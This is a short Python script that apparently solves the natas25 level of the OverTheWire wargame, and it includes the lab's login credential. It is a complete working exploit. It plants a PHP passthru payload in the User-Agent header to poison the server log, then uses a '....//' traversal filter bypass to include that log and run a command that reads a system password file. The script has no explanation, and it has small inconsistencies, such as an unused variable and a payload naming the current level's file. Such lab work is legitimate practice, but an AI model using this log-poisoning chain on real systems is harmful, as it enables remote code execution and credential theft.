import requests

natas26_password = f''

url = 'http://natas25.natas.labs.overthewire.org/'
auth = ('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')

s = requests.session()
s.auth = auth

params1 = {'lang': 'de'}
r1 = s.get(url=url, params=params1)
print(r1.text)
cj = requests.utils.dict_from_cookiejar(s.cookies)

headers = {
        'User-Agent': "<?php passthru('cat /etc/natas_webpass/natas25') ?>",
}

params2 = {'lang': f"....//logs/natas25_{cj['PHPSESSID']}.log" }
print(cj['PHPSESSID'])
print(params2)
r2 = s.get(url=url, params=params2, headers=headers)
print(r2.text)
